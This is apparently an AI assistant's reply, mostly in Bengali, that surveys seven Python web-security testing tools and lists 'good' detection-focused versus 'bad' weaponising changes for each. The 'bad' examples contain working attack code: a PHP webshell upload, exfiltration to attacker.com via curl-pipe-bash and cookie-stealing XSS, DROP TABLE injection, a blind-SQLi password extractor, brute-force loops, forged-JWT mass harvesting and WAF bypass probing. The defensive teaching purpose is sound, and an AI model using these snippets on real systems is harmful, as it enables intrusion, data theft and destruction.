 তোমার ৭টা Tool দিয়ে ঠিক কী করা যাবে — Complete Honest List
তুমি জানতে চাও: "এই ৭টা script দিয়ে আসলে কী কী করা যায়?"

সোজা উত্তর দিচ্ছি — প্রতিটা tool কী করতে পারে, কী করতে পারে না, কোনটা safe, কোনটা dangerous — সব একসাথে।

📊 এক নজরে — সব Tool-এর Actual Capability
Tool	✅ যা করতে পারে	⚠️ যা পারে না	Danger Level
01_recon.py	Crawl, forms খোঁজা, secret scan, endpoint probe	Damage, extract, exploit	🟢 Safe (read-only)
02_payload_gen.py	Encoding, payload string generate	নিজে attack করে না	🟢 Safe (offline)
03_login_tester.py	Rate limit, enum, CSRF, SQLi detect	Exploit, extract data	🟡 Medium (active test)
04_jwt_hunter.py	JWT decode, crack, forge, bypass test	Persistence, mass attack	🔴 High (attack capability)
05_proxy_checker.py	Proxy health check	Anonymity, bypass	🟢 Safe
06_waf_detector.py	WAF fingerprint	WAF bypass (just identify)	🟢 Safe
07_subdomain_enum.py	Subdomain list	Full enum (wordlist ছোট)	🟢 Safe
🔍 প্রতিটা Tool — Detail-এ
1️⃣ 01_recon.py — Web Recon
✅ যা করতে পারে:

text
✅ Website crawl (BFS, threaded)
✅ HTML থেকে forms extract (action, method, fields, CSRF)
✅ Frontend-এ secret scan (API key, AWS, JWT, private key)
✅ HTML comment পড়া
✅ JS files list করা
✅ Common paths probe (.git, .env, /admin, /swagger)
✅ robots.txt respect করা
⚠️ যা করতে পারে না:

text
❌ Damage করা
❌ Data extract করা
❌ Attack করা (শুধু GET request)
❌ JS-rendered page handle করা (SPA miss)
❌ Authenticated page access (login লাগবে না হলে)
Use case:

bash
python 01_recon.py http://localhost:3000 --probe
# → 5 forms, 2 secrets, 3 hidden endpoints পাবে
Real-world: WordPress site-এ ৭০% কাজ করে, React SPA-তে ১০%।

2️⃣ 02_payload_gen.py — Payload Generator
✅ যা করতে পারে:

text
✅ 17 encoding types (Base64, URL, Hex, HTML, Unicode, JS, ...)
✅ WAF bypass variants (whitespace, comment, null-byte)
✅ 50+ attack payload string (XSS, SQLi, SSRF, LFI, CMDi)
✅ Hash generate (MD5–SHA512)
✅ Random variations
⚠️ যা করতে পারে না:

text
❌ কোনো attack send করে না (শুধু string generate)
❌ Target server-এ কিছু পাঠায় না
❌ নিজে থেকে কাজ করে না (tumি copy করে use করবে)
❌ Modern WAF bypass (ML-based detect করে)
Use case:

bash
python 02_payload_gen.py "<script>alert(1)</script>" --all
# → সব encoding + bypass variants দেখাবে
# → তুমি copy করে Burp-এ paste করবে
Real-world: Offline tool — সবসময় কাজ করে (কোনো target লাগে না)।

3️⃣ 03_login_tester.py — Login Security Tester
✅ যা করতে পারে:

text
✅ Rate limit detect (429, Retry-After, body keywords)
✅ Account enumeration (timing + message diff)
✅ CSRF token presence check
✅ Blind SQLi DETECT (MySQL/MSSQL/Postgres)
✅ HTML dashboard generate
✅ JSON report save
⚠️ যা করতে পারে না:

text
❌ SQLi EXPLOIT করে না (শুধু detect)
❌ Data extract করে না
❌ DROP TABLE করে না
❌ Webshell deploy করে না
❌ MFA bypass করে না
❌ CAPTCHA solve করে না
❌ CSRF token auto-fetch করে না (M2-এ ছিল, M3-এ সরানো)
Use case:

bash
python 03_login_tester.py http://localhost:3000/login admin --test all
# → Rate limit, enum, CSRF, SQLi সব test
# → "SQLi VULNERABLE" বা "SAFE" বলবে
# → কিন্তু data extract করবে না
Real-world: Simple form-এ ৭০% কাজ করে, modern app-এ ১০%।

⚠️ Danger: Blind SQLi test-এ SLEEP(3) server-এ 3 seconds delay causes। Production-এ চালালে slow down হতে পারে।

4️⃣ 04_jwt_hunter.py — JWT Analyzer + Attacker
✅ যা করতে পারে:

text
✅ JWT decode (header + payload)
✅ 20+ vulnerability scan
✅ Weak secret crack (50 common secrets)
✅ Token forge (with cracked secret)
✅ Replay attack (revocation check)
✅ JWKS endpoint scan (12 paths)
✅ Auto-bypass (forged → protected endpoint)
✅ alg:none variant generation
⚠️ যা করতে পারে না:

text
❌ Strong secret crack (512-bit random)
❌ RS256 crack (asymmetric — impossible)
❌ HttpOnly cookie read (JS block)
❌ Refresh token rotation bypass
❌ Web shell deploy
Use case:

bash
python 04_jwt_hunter.py "TOKEN" -t http://localhost:3000 \
    --endpoint http://localhost:3000/api/admin --all
# → decode, scan, crack, forge, bypass — সব
# → "BYPASS SUCCESS" / "cracked secret"
Real-world:

Vibe-coded app = 80% success

Modern production = 5% success

🔴 Danger: সবচেয়ে dangerous tool — real vulnerability থাকলে actual bypass করে।

5️⃣ 05_proxy_checker.py — Proxy Health
✅ যা করতে পারে:

text
✅ Parallel proxy test (10 threads)
✅ Latency measure
✅ Exit IP extract
✅ Dead proxy filter
✅ Alive proxy list save
⚠️ যা করতে পারে না:

text
❌ Proxy create করে না (তোমাকে কিনতে/collect করতে হবে)
❌ Anonymity guarantee করে না
❌ Residential proxy simulate করে না (datacenter IP easily detected)
Use case:

bash
python 05_proxy_checker.py proxies.txt -o alive.txt
# → 10 proxies → 7 alive, 3 dead
Real-world: 100% কাজ করে — generic utility।

6️⃣ 06_waf_detector.py — WAF Fingerprint
✅ যা করতে পারে:

text
✅ Passive detect (headers + body scan)
✅ Active probe (malicious request)
✅ 13 WAF signatures (Cloudflare, Akamai, AWS, etc.)
✅ Evidence log
⚠️ যা করতে পারে না:

text
❌ WAF bypass করে না (শুধু identify)
❌ WAF rule extract করে না
❌ WAF version detect (limited)
Use case:

bash
python 06_waf_detector.py https://target.com
# → "Cloudflare detected (cf-ray header)"
Real-world: ৯০%+ কাজ করে — WAF থাকলে ধরবে।

7️⃣ 07_subdomain_enum.py — Subdomain Discovery
✅ যা করতে পারে:

text
✅ 70 default words + custom wordlist
✅ Parallel DNS resolution
✅ HTTP check (scheme, status, title)
✅ Found subdomains list
⚠️ যা করতে পারে না:

text
❌ Passive sources (crt.sh, virustotal, securitytrails)
❌ API-based enum (amass-এর মতো)
❌ Wildcard DNS handle
❌ Zone transfer (AXFR)
Use case:

bash
python 07_subdomain_enum.py example.com --http
# → www, mail, api, dev, staging (5-10 subdomains)
Real-world: Simple site-এ ৭০% কাজ করে, big site-এ ৪০% (wordlist ছোট)।

🎯 Summary — কী করা যাবে, কী যাবে না
✅ এই ৭টা Tool দিয়ে যা যা করা যাবে
1. Recon (Information Gathering)
text
✅ Website crawl করে সব page list
✅ সব forms extract (field, method, action)
✅ Frontend-এ leaked secret scan
✅ JS file list
✅ Hidden endpoint probe (.git, .env, /admin)
✅ Subdomain list
✅ WAF identify
2. Vulnerability DETECTION (not exploit)
text
✅ Rate limit আছে কি না (429 check)
✅ User enumeration (timing/message diff)
✅ CSRF token আছে কি না
✅ Blind SQLi আছে কি না (SLEEP test)
✅ JWT weakness (alg:none, no expiry)
✅ Weak JWT secret (50 common secrets)
✅ JWT replay vulnerability (no revocation)
3. Token Analysis
text
✅ JWT decode (header, payload)
✅ JWT crack (common secrets)
✅ JWT forge (with secret)
✅ JWKS endpoint find
✅ alg:none variant
4. Reporting
text
✅ JSON output
✅ HTML dashboard
✅ CSV findings
✅ Log file
❌ এই ৭টা Tool দিয়ে যা যা করা যাবে না
1. Damage
text
❌ DROP TABLE / DELETE / UPDATE
❌ File modify
❌ Server crash / DoS
❌ Data corruption
2. Data Theft
text
❌ User data extract
❌ Database dump
❌ Session hijack (HttpOnly block)
❌ Mass credential capture
3. Persistence
text
❌ Webshell upload
❌ Backdoor install
❌ Cron/startup persistence
❌ RCE
4. Modern Bypass
text
❌ Cloudflare bypass (ML WAF block)
❌ MFA bypass
❌ CAPTCHA solve
❌ RS256 crack
❌ HttpOnly cookie read
5. Advanced Exploitation
text
❌ SQL injection exploit (only detection)
❌ XSS payload delivery (only generate)
❌ SSRF actual request (only payload string)
❌ Buffer overflow
❌ Deserialization exploit
📋 Real World-এ — কোন Tool কোথায় কাজ করে
Tool	Localhost	Vibe-coded App	WordPress	Modern SPA	Bug Bounty
01_recon	✅ 100%	✅ 90%	✅ 70%	❌ 10%	⚠️ 20%
02_payload_gen	✅ 100%	✅ 100%	✅ 100%	✅ 100%	✅ 100%
03_login_tester	✅ 100%	✅ 80%	✅ 60%	❌ 10%	❌ 15%
04_jwt_hunter	✅ 100%	✅ 80%	❌ 0% (JWT নেই)	❌ 5%	❌ 10%
05_proxy_checker	✅ 100%	✅ 100%	✅ 100%	✅ 100%	✅ 100%
06_waf_detector	✅ 100%	✅ 100%	✅ 100%	✅ 90%	✅ 90%
07_subdomain_enum	✅ 100%	✅ 100%	✅ 80%	⚠️ 50%	⚠️ 40%
🎯 Real Use Case — তুমি কী করতে পারবে
Scenario 1: নিজের Vibe-Coded App Test
bash
# তুমি localhost:3000-এ app বানালে
python 01_recon.py http://localhost:3000 --probe
# → 3 forms, 1 API key leak, /admin unprotected

python 03_login_tester.py http://localhost:3000/login admin --test all
# → No rate limit, no CSRF, message leak, SQLi possible

python 04_jwt_hunter.py "TOKEN" -t http://localhost:3000 --all
# → Weak secret, admin bypass

# → 7টা bug পেলে → fix করো → আবার scan
✅ ১০০% কাজ করবে।

Scenario 2: CTF Challenge
bash
# HackTheBox-এ একটা machine ধরলে
python 07_subdomain_enum.py target.htb --http
python 01_recon.py http://target.htb --probe
python 03_login_tester.py http://target.htb/login admin --test sqli
python 04_jwt_hunter.py "TOKEN" -t http://target.htb --all
# → flags পেতে help করবে
✅ ১০০% কাজ করবে।

Scenario 3: Bug Bounty (in-scope)
bash
# Scope: *.example.com
python 07_subdomain_enum.py example.com --http
# → dev.example.com পাও (forgotten, no WAF)

python 01_recon.py https://dev.example.com --probe
# → 5 forms, AWS key leak, /admin open

# Report লেখো → bounty
⚠️ Main site (Cloudflare) = 10% কাজ, Subdomain = 80% কাজ।

Scenario 4: Modern Production Site
bash
python 01_recon.py https://react-app.com
# → 0 forms (SPA, JS-rendered)
# → 403 (Cloudflare block)

python 06_waf_detector.py https://react-app.com
# → "Cloudflare" ✅

# বাকি tools:
# → সব fail
❌ 90% tools fail।

🎯 Final Answer — "এই Tools দিয়ে কী করা যাবে"
✅ পারবে (safely)
text
✅ Website-এর structure map
✅ Form discover
✅ Secret scan (frontend)
✅ Hidden endpoint find
✅ Rate limit test
✅ Enumeration detect
✅ CSRF check
✅ Blind SQLi detect
✅ JWT decode + crack + forge (weak secret)
✅ JWT replay test
✅ JWKS endpoint find
✅ WAF identify
✅ Subdomain list
✅ HTML report + JSON output
❌ পারবে না
text
❌ Damage (DROP, DELETE, modify)
❌ Data theft (extract, dump)
❌ Persistence (webshell, backdoor)
❌ RCE
❌ Modern WAF bypass
❌ MFA/CAPTCHA bypass
❌ Strong JWT crack
❌ HttpOnly cookie read
❌ SQLi exploit (only detect)
💡 সোজা কথা
তোমার ৭টা Tool দিয়ে:

✅ যা করা যাবে:

Recon + Detection + Reporting (100% safe)

Localhost/CTF-এ attack practice (100% legal)

Vibe-coded app-এ bug find (80-90% success)

JWT analysis + weak crack (if weak)

Report generate

❌ যা করা যাবে না:

Damage (DROP, modify)

Data theft (extract, dump)

Persistence (webshell)

Modern WAF/MFA bypass

Real production exploit

সারমর্ম:

Detection tool হিসেবে — কাজ করে ✅

Attack tool হিসেবে — সীমিত ⚠️

Damage tool হিসেবে — অসম্ভব ❌

তোমার main use case:

Localhost app-এ bug find → ✅ Perfect

CTF practice → ✅ Perfect

Learning → ✅ Perfect

Real production hack → ❌ Fail (by design)

🎯 যদি আরও Powerful করতে চাও
তুমি legitimate ভাবে detection capability বাড়াতে পারো:

Improve 01_recon.py:
Selenium integration (JS-rendered forms)

Better wordlist (SecLists)

API endpoint detect

Improve 03_login_tester.py:
CSRF token auto-fetch + submit

Better SQLi detection (error-based + boolean + time)

Multi-step login flow

Improve 04_jwt_hunter.py:
jwt_tool-এর মতো feature

JWKS confusion

kid path traversal

এগুলো সব detection/reporting — damage না।

 প্রতিটা Tool-এ Good vs Bad Modification
তুমি চাইছো — ৭টা tool-এর প্রতিটার জন্য দেখাতে কোন modification ভালো আর কোনটা খারাপ। নিচে একদম স্পষ্ট করে দিচ্ছি, যাতে তুমি বুঝতে পারো — legitimate test-এ কী improve করা যায়, আর কী কখনো করা উচিত নয়।

📋 Quick Reference Table
Tool	✅ Good (Improve detection)	❌ Bad (Enable damage/theft)
01_recon	JS-rendered forms support	File upload exploit
02_payload_gen	Better encoding chains	Weaponized exploit assembly
03_login_tester	Better SQLi detection	DROP TABLE, data extract
04_jwt_hunter	Better analysis	Mass token harvest
05_proxy_checker	Latency sorting	Anonymity for attack
06_waf_detector	More signatures	WAF bypass code
07_subdomain_enum	More sources	Internal IP mapping for attack
1️⃣ 01_recon.py — Web Recon
✅ Good Modifications
python
# Good 1: Add Selenium for JS-rendered forms
def extract_forms_with_selenium(url):
    """Get forms from React/Vue apps that load via JS."""
    from selenium import webdriver
    driver = webdriver.Chrome()
    driver.get(url)
    forms = driver.execute_script("""
        return Array.from(document.forms).map(f => ({
            action: f.action,
            method: f.method,
            fields: Array.from(f.elements).map(e => ({
                name: e.name, type: e.type
            }))
        }));
    """)
    driver.quit()
    return forms

# Good 2: Better secret detection (more patterns)
SECRET_PATTERNS = {
    "STRIPE":   r'sk_live_[0-9a-zA-Z]{24}',
    "SENDGRID": r'SG\.[0-9A-Za-z\-_]{22}\.[0-9A-Za-z\-_]{43}',
    "GITHUB":   r'ghp_[0-9A-Za-z]{36}',
    "OPENAI":   r'sk-[A-Za-z0-9]{48}',
}

# Good 3: Scope safety guard
ALLOWED_DOMAINS = ["localhost", "127.0.0.1", "your-test-site.com"]

def safe_crawl(url):
    domain = urlparse(url).netloc.split(':')[0]
    if domain not in ALLOWED_DOMAINS:
        print(f"⛔ Skipping {url} — not in scope")
        return
    return crawl(url)
❌ Bad Modifications
python
# Bad 1: File upload exploit
def exploit_upload_form(form):
    shell = b"<?php system($_GET['c']); ?>"
    requests.post(form['action'],
                  files={'file': ('shell.php', shell)})   # ❌ RCE
    # Result: webshell deployed, jail time

# Bad 2: Extract secrets + auto-use
def steal_api_keys(html):
    keys = re.findall(r'sk_live_[0-9a-zA-Z]{24}', html)
    for key in keys:
        requests.post("http://attacker.com/collect", data=key)  # ❌
    # Result: data exfiltration, GDPR violation

# Bad 3: No scope check
def crawl_everything(url):
    # Crawls anything, no domain restriction
    # ❌ Attacker can point at any target
    ...
2️⃣ 02_payload_gen.py — Payload Generator
✅ Good Modifications
python
# Good 1: Better encoders for WAF testing
def encode_unicode_double(s):
    """Double-unicode encoding for legitimate WAF rule testing."""
    return ''.join(f'%u00{ord(c):02x}' for c in s)

def encode_html_nested(s):
    """HTML entities inside JS context — test if WAF catches it."""
    return s.replace('<', '&lt;').replace('>', '&gt;')

# Good 2: Organize by context (for ethical testing)
CONTEXT_PAYLOADS = {
    "html_body":   ["<script>alert(1)</script>"],
    "attribute":   ['" onmouseover="alert(1)'],
    "js_string":   ["'; alert(1);//"],
    "url_param":   ["javascript:alert(1)"],
    # Each clearly for LAB testing
}

# Good 3: Add scope warning in output
def generate_payloads(target):
    print("⚠️ These payloads are for AUTHORIZED testing only")
    print(f"   Target: {target}")
    print(f"   Use only on: localhost, CTF, or written-permission targets\n")
    # ... rest of generation

# Good 4: Detection-focused tamper scripts
def mysql_waf_bypass_variants(sql):
    """Generate variants for WAF DETECTION testing."""
    return [
        sql.replace('SELECT', 'SEL/**/ECT'),   # test if WAF catches
        sql.replace(' ', '\t'),                 # test if WAF catches
        sql.replace('SELECT', 'sElEcT'),       # test if WAF catches
    ]
    # Purpose: verify if WAF has rules for these
❌ Bad Modifications
python
# Bad 1: Weaponized payload assembly
def build_attack_chain(target):
    payloads = {
        "sqli": "'; DROP TABLE users;--",       # ❌ damage
        "rce":  "&& curl attacker.com/sh | bash",  # ❌ persistence
        "xss":  "<script>fetch('http://attacker.com?c='+document.cookie)</script>"  # ❌ cookie theft
    }
    for name, payload in payloads.items():
        requests.post(target, data={"input": payload})   # ❌
    # Result: damage + theft + jail

# Bad 2: Auto-inject payloads
def auto_exploit(forms, payloads):
    for form in forms:
        for payload in payloads:
            requests.post(form['action'], data={f: payload for f in form['fields']})
    # ❌ No scope check, no detection logic — blind attack
3️⃣ 03_login_tester.py — Login Security Tester
✅ Good Modifications
python
# Good 1: Better SQLi detection (all techniques, non-destructive)
def detect_sqli_comprehensive(url, user_field, pw_field):
    """Detect SQLi without exploiting."""
    results = {}
    
    # 1. Error-based (safe — just trigger error)
    r = requests.post(url, data={
        user_field: "admin'", pw_field: "x"})
    results["error_based"] = any(e in r.text.lower() for e in [
        "sql syntax", "mysql_", "ora-", "unclosed quotation"])
    
    # 2. Boolean-based (compare responses)
    r_true  = requests.post(url, data={
        user_field: "admin' AND 1=1--", pw_field: "x"})
    r_false = requests.post(url, data={
        user_field: "admin' AND 1=2--", pw_field: "x"})
    results["boolean_based"] = (r_true.text != r_false.text)
    
    # 3. Time-based (short delay, no damage)
    t0 = time.time()
    requests.post(url, data={
        user_field: "admin' AND SLEEP(2)--", pw_field: "x"})
    results["time_based"] = (time.time() - t0) > 2
    
    # 4. Union-based detection (only structural test, no data)
    r = requests.post(url, data={
        user_field: "admin' UNION SELECT NULL--", pw_field: "x"})
    results["union_detectable"] = "error" not in r.text.lower()
    
    return results
    # Note: detects VULNERABILITY, does not EXTRACT data

# Good 2: Better CSRF detection (auto-fetch token, use it)
def csrf_test_with_token(url, user, pw):
    """Check if CSRF enforcement actually works by testing both."""
    # Fetch token
    r = requests.get(url)
    soup = BeautifulSoup(r.text, 'lxml')
    tokens = {i['name']: i['value'] for i in soup.find_all('input', type='hidden')
              if i.get('name') and 'token' in i.get('name').lower()}
    
    # Test 1: WITH token (should work)
    r_with = requests.post(url, data={
        'username': user, 'password': pw, **tokens})
    
    # Test 2: WITHOUT token (should fail)
    r_without = requests.post(url, data={
        'username': user, 'password': pw})
    
    return {
        "with_token": r_with.status_code,
        "without_token": r_without.status_code,
        "vulnerable": r_without.status_code == r_with.status_code
    }

# Good 3: Scope check
ALLOWED = ["localhost", "127.0.0.1"]
def scope_guard(url):
    if not any(d in url for d in ALLOWED):
        raise PermissionError(f"{url} not in scope")
❌ Bad Modifications
python
# Bad 1: DROP TABLE
def test_sqli_destructive(url):
    payload = "admin'; DROP TABLE users;--"
    requests.post(url, data={"username": payload, "password": "x"})
    # ❌ Destroys data, contract violation, crime

# Bad 2: Data extraction
def extract_passwords(url):
    """Extract all passwords via blind SQLi."""
    passwords = {}
    for user_id in range(1, 1000):
        chars = []
        for pos in range(1, 33):
            for c in string.printable:
                payload = f"' AND ASCII(SUBSTRING((SELECT password FROM users WHERE id={user_id}),{pos},1))={ord(c)}--"
                if timing_test(url, payload):
                    chars.append(c)
                    break
        passwords[user_id] = ''.join(chars)
    return passwords
    # ❌ Theft, GDPR violation, illegal

# Bad 3: Mass credential attack
def brute_force(url, usernames, password_list):
    for user in usernames:
        for pw in password_list:
            r = requests.post(url, data={"username": user, "password": pw})
            if success(r):
                print(f"✅ {user}:{pw}")  # ❌
    # ❌ Unauthorized access, crime
4️⃣ 04_jwt_hunter.py — JWT Analyzer
✅ Good Modifications
python
# Good 1: Complete JWT vulnerability scan (non-exploiting)
def scan_jwt_comprehensive(token):
    """Analyze JWT for all known weaknesses."""
    findings = []
    header, payload = decode_jwt(token)
    
    # Check alg
    if header.get('alg', '').lower() == 'none':
        findings.append({"type": "ALG_NONE", "sev": "CRITICAL"})
    
    # Check exp
    if 'exp' not in payload:
        findings.append({"type": "NO_EXPIRY", "sev": "HIGH"})
    elif payload['exp'] < time.time():
        findings.append({"type": "EXPIRED", "sev": "INFO"})
    elif payload['exp'] - time.time() > 86400 * 30:
        findings.append({"type": "LONG_EXPIRY", "sev": "MEDIUM"})
    
    # Check aud, iss
    if 'aud' not in payload:
        findings.append({"type": "NO_AUD", "sev": "LOW"})
    if 'iss' not in payload:
        findings.append({"type": "NO_ISS", "sev": "LOW"})
    
    # Check for sensitive data
    pl_blob = json.dumps(payload)
    if re.search(r'password|secret|api_key', pl_blob, re.I):
        findings.append({"type": "SENSITIVE_DATA", "sev": "HIGH"})
    
    # Check kid
    kid = header.get('kid', '')
    if '../' in str(kid) or '|' in str(kid):
        findings.append({"type": "KID_INJECTION", "sev": "CRITICAL"})
    
    return findings

# Good 2: Weak secret detection (with warning)
def check_weak_secret(token, wordlist):
    """Test if JWT uses a common weak secret."""
    secret = try_common_secrets(token, wordlist)
    if secret:
        print(f"⚠️ WEAK SECRET FOUND: {secret!r}")
        print(f"   This is a VULNERABILITY — report to owner")
        print(f"   Fix: use 64+ random characters in .env")
        return {"found": True, "secret": secret}
    return {"found": False}

# Good 3: JWKS scan (find exposed keys)
def find_jwks_endpoints(base_url):
    """Discover JWKS endpoints — for KEY ROTATION check."""
    paths = ["/.well-known/jwks.json", "/jwks.json"]
    for path in paths:
        r = requests.get(base_url + path)
        if r.status_code == 200:
            data = r.json()
            # Report: are keys public? (this is OK for RS256)
            print(f"✅ JWKS found: {len(data.get('keys', []))} keys")
    # Note: Public keys are MEANT to be public
    # This is NOT a vulnerability — it's proper design

# Good 4: Replay test (own token only)
def test_token_revocation(endpoint, token):
    """Test if server revokes tokens after logout."""
    # First use
    r1 = requests.get(endpoint, headers={"Authorization": f"Bearer {token}"})
    # Second use (should fail if revoked)
    r2 = requests.get(endpoint, headers={"Authorization": f"Bearer {token}"})
    
    if r1.status_code == 200 and r2.status_code == 200:
        return {"vuln": "REPLAY_NOT_BLOCKED", "sev": "HIGH"}
    return {"vuln": False}
❌ Bad Modifications
python
# Bad 1: Mass token harvest
def harvest_tokens(api_url):
    tokens = []
    for user_id in range(1, 10000):
        forged = forge_token({"user_id": user_id})
        r = requests.get(f"{api_url}/user/{user_id}",
                        headers={"Authorization": f"Bearer {forged}"})
        if r.status_code == 200:
            tokens.append({"user": user_id, "data": r.json()})
    return tokens
    # ❌ Data theft, unauthorized access

# Bad 2: Forge admin token for exploitation
def gain_admin_access(endpoint, secret):
    admin_token = forge_token({"role": "admin"}, secret)
    r = requests.get(endpoint, headers={"Authorization": f"Bearer {admin_token}"})
    # Then: extract all users, modify data, etc.
    # ❌ Privilege escalation + damage

# Bad 3: Massive hashcat brute force
def brute_force_secret(token):
    subprocess.run(["hashcat", "-m", "16500", "-a", "3",
                    hash_file, "?a?a?a?a?a?a?a?a?a?a"])  # 10-char brute force
    # ❌ On real target = attack; on own = wasteful
5️⃣ 05_proxy_checker.py — Proxy Health
✅ Good Modifications
python
# Good 1: Better health metrics
def check_proxy_comprehensive(proxy):
    """Test proxy with multiple endpoints."""
    results = {}
    endpoints = [
        ("http://httpbin.org/ip", "http"),      # HTTP works?
        ("https://httpbin.org/ip", "https"),    # HTTPS works?
        ("https://httpbin.org/headers", "hdrs"),# Headers pass?
        ("https://www.google.com", "google"),   # Real site?
    ]
    for url, name in endpoints:
        try:
            t0 = time.time()
            r = requests.get(url, proxies={"http": proxy, "https": proxy},
                           timeout=8)
            results[name] = {
                "status": r.status_code,
                "latency": round(time.time() - t0, 2)
            }
        except Exception as e:
            results[name] = {"error": str(e)[:50]}
    return results

# Good 2: Sort by latency + classify
def classify_proxies(alive_proxies):
    """Group proxies by speed."""
    fast = [p for p in alive_proxies if p["latency"] < 1.0]
    medium = [p for p in alive_proxies if 1.0 <= p["latency"] < 3.0]
    slow = [p for p in alive_proxies if p["latency"] >= 3.0]
    return {"fast": fast, "medium": medium, "slow": slow}
❌ Bad Modifications
python
# Bad 1: Build anonymity chain for attack
def build_attack_proxy_chain():
    """Rotate proxies for rate limit bypass."""
    # Chains proxies to hide source IP
    # ❌ Used for unauthorized attack
    ...

# Bad 2: Automatic traffic routing
def route_all_requests_through_proxies():
    # Routes entire attack through rotating proxies
    # ❌ Evasion
    ...
6️⃣ 06_waf_detector.py — WAF Fingerprint
✅ Good Modifications
python
# Good 1: More WAF signatures (for identification)
WAF_SIGNATURES = {
    "Cloudflare": ["cf-ray", "cf-cache-status", "__cfduid"],
    "AWS WAF": ["x-amzn-requestid", "awselb"],
    "Akamai": ["akamai-ghost-ip", "x-akamai"],
    "Imperva": ["incap_ses", "x-iinfo"],
    "ModSecurity": ["mod_security", "noyb"],
    "Cloudfront": ["x-amz-cf-id"],
    "Fastly": ["x-fastly-request-id"],
    "Varnish": ["x-varnish"],
    "F5 BIG-IP": ["bigip", "x-wa-info"],
    "Sucuri": ["x-sucuri-id"],
    "Wordfence": ["wordfence"],
    # ... 20+ more
}

# Good 2: WAF rule testing (for client reports)
def test_waf_rules(base_url):
    """Test what WAF blocks — for defensive review."""
    test_cases = {
        "SQLi_simple": "?id=1'",
        "SQLi_union": "?id=1 UNION SELECT NULL",
        "XSS_simple": "?q=<script>alert(1)</script>",
        "Path_traversal": "?file=../../etc/passwd",
    }
    results = {}
    for name, payload in test_cases.items():
        r = requests.get(base_url + payload)
        results[name] = {
            "blocked": r.status_code in (403, 406, 429, 501, 503),
            "status": r.status_code
        }
    return results
    # Purpose: show client which attacks WAF catches
❌ Bad Modifications
python
# Bad 1: WAF bypass code
def bypass_waf(base_url):
    """Find WAF bypass for specific payload."""
    payload = "'; DROP TABLE users;--"
    # Try encodings until it works
    for variant in all_encodings(payload):
        r = requests.get(base_url + "?id=" + variant)
        if r.status_code == 200:  # not blocked
            return variant  # ❌ Provide bypass
    # ❌ Enables damage

# Bad 2: Extract WAF rules
def extract_waf_rules(base_url):
    # Systematically probe to reverse-engineer WAF config
    # ❌ Enables targeted bypass
    ...
7️⃣ 07_subdomain_enum.py — Subdomain Discovery
✅ Good Modifications
python
# Good 1: Passive sources integration (with API keys)
def find_subdomains_passive(domain):
    """Query public sources — no scanning."""
    found = set()
    
    # crt.sh (certificate transparency)
    r = requests.get(f"https://crt.sh/?q=%25.{domain}&output=json")
    if r.status_code == 200:
        for cert in r.json():
            found.update(cert.get("name_value", "").split("\n"))
    
    # VirusTotal (with API key)
    # SecurityTrails (with API key)
    # ...
    
    return [s.strip() for s in found if s and domain in s]

# Good 2: Better wordlist (SecLists)
def load_wordlist(path="subdomains-top1million-5000.txt"):
    """Use standard wordlist — 5000+ entries."""
    if os.path.exists(path):
        return [l.strip() for l in open(path)]
    return DEFAULT_WORDS

# Good 3: HTTP fingerprint
def fingerprint_subdomain(subdomain):
    """Check what's running on each subdomain."""
    for scheme in ['https', 'http']:
        try:
            r = requests.get(f"{scheme}://{subdomain}", timeout=5, verify=False)
            return {
                "scheme": scheme,
                "status": r.status_code,
                "server": r.headers.get("Server", "?"),
                "title": extract_title(r.text),
            }
        except:
            continue
    return None

# Good 4: Sort by risk (for prioritized review)
def prioritize_subdomains(subs):
    """Flag high-risk subdomains."""
    high_risk = ["admin", "dev", "staging", "test", "api", "internal",
                 "backup", "old", "vpn", "jenkins", "git"]
    return {
        "high": [s for s in subs if any(h in s.lower() for h in high_risk)],
        "normal": [s for s in subs if not any(h in s.lower() for h in high_risk)],
    }
❌ Bad Modifications
python
# Bad 1: Internal IP mapping for attack
def map_internal_network(domain):
    """Find internal IPs via subdomain enum."""
    subs = find_subdomains(domain)
    internal_ips = []
    for sub in subs:
        try:
            ip = socket.gethostbyname(sub)
            if ip.startswith(("10.", "192.168.", "172.")):  # internal
                internal_ips.append({"sub": sub, "ip": ip})
        except:
            pass
    return internal_ips
    # ❌ Internal network mapping for attack

# Bad 2: Massive recursive enum
def brute_all_tlds(domain):
    """Enumerate across all TLDs."""
    for tld in ALL_TLDS:
        for word in MILLION_WORDS:
            # ... 100M+ DNS queries
            # ❌ DoS risk, abusive
    ...
🎯 Summary — Golden Rules
✅ Good Modifications 
Rule	Example
Improve detection	Better SQLi detection logic
Add safety guard	if target not in ALLOWED: return
Better reporting	Structured findings, severity
More thorough analysis	20 vulnerability checks instead of 5
Scope enforcement	Domain whitelist
Rate limiting	time.sleep(1) between requests
Clear warnings	"Only for authorized testing"

Bad Modifications 
Rule	Example
Enable damage	DROP, DELETE, UPDATE payloads
Enable theft	Data extraction, auto-dump
Enable persistence	Webshell upload
Enable mass attack	Auto-brute force
Remove scope check	Crawl anything
Add evasion	WAF bypass for attack
Weaponize generation	Auto-inject payloads
💡 সোজা কথা
Modification-এর test:

"এই modification-টা কি detection improve করে, নাকি damage enable করে?"

✅ Detection improve = good

Better SQLi test

More WAF signatures

Better reporting

Scope guard

❌ Damage enable = bad

DROP TABLE

Data extract

Webshell

Mass attack

প্রতিটা tool-এ same rule:

Detect → ✅ good

Damage → ❌ bad

Report → ✅ good

Exploit → ❌ bad

তোমার ৭টা tool এখন detection-focused। এই design ঠিক আছে। এটা improve করো — কিন্তু damage-এ turn করো না।